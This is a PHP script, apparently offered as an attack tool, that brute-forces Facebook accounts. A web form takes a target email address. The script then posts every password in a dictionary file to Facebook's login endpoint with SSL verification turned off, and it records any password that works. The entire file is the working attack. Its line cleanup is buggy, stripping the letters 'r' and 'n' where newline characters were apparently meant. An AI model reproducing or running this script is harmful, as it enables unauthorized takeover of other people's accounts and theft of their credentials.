<? 

function setData($email,$pass) 

{ 

global $vars; 

$vars["charset_test"]=urldecode("%E2%82%AC%2C%C2%B4%2C%E2%82%AC%2C%C2%B4%2C%E6%B0%B4%2C%D0%94%2C%D0%84"); 

$vars["return_session"]=0; 

$vars["email"]=$email; 

$vars["pass"]=trim($pass); 

$vars["persistent"]=1; 

$vars["charset_test"]=urldecode("%E2%82%AC%2C%C2%B4%2C%E2%82%AC%2C%C2%B4%2C%E6%B0%B4%2C%D0%94%2C%D0%84"); 

$vars["login"]="Login"; 



$data=""; 

foreach($vars as $key=>$value) 

{ 

$data.=$key."=".urlencode($value)."&"; 

} 

return $data; 

} 

set_time_limit(0); 

ini_set('output_buffering',true); 

$dictionary =dirname(__FILE__)."\wordlist\mil-dic.txt"; // need dictionary to password list 

function CheckItOut($email,$pass) 

{ 

$ret=false; 

$useragent = "Opera/9.21 (Windows NT 5.1; U; tr)"; 

$data = setData($email,$pass); 

$ch = curl_init('https://login.facebook.com/login.php?login_attempt=1'); 

curl_setopt($ch, CURLOPT_HEADER, 0); 

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 

curl_setopt($ch, CURLOPT_ENCODING , "gzip,deflate"); 

curl_setopt($ch, CURLOPT_POST, 1); 

curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 

curl_setopt($ch, CURLOPT_USERAGENT, $useragent); 

curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__).'/cookie.txt'); 

curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__).'/cookie.txt'); 

$source=curl_exec($ch); 



$info=curl_getinfo($ch); 





if($info["redirect_count"]==1) 

{ 

$ret=true; 

} 







return $ret; 

} 

echo "<form action=\"brute.php\" method=\"post\"><table align=\"center\"> 

<tr><td colspan=2>Entry Email Address below to Bruteforce...</td> 

</tr> 



<tr><td>Email Address:</td> 

<td><input type=text name=\"username\" value=\"\"></td></tr> 

<tr><td>Click the Submit Button to Start..</td> 

<td><input type=\"submit\" value=\"Submit\"></td></tr> 

</table>"; 

if(isset($_POST['username'])) 

{ 



$username =$_POST['username']; 

if(!is_file($dictionary)){echo "$dictionary is not file";exit;} 

$lines=file($dictionary); 

echo "Attack Starting..</br></br>"; 

sleep(3); 

echo "Attack Started, brute forcing.. </br> "; 

foreach($lines as $line) 

{ 

$line=str_replace("r","",$line); 

$line=str_replace("n","",$line); 

if(CheckItOut($username,$line)) 

{ 

echo "[+] username:$username , password:$line - Password found : $line</br>"; 

$fp=fopen('cookie.txt','w'); 

fwrite($fp,'successfully pass:'.$line); 

exit; 

}else{ 

echo "[-] username:$username , password:$line - Password not found :$line</br>"; 

} 

/** 

* Print the result direct onto the browser screen... 

*/ 

ob_flush(); 

flush(); 

} 

} 

?>
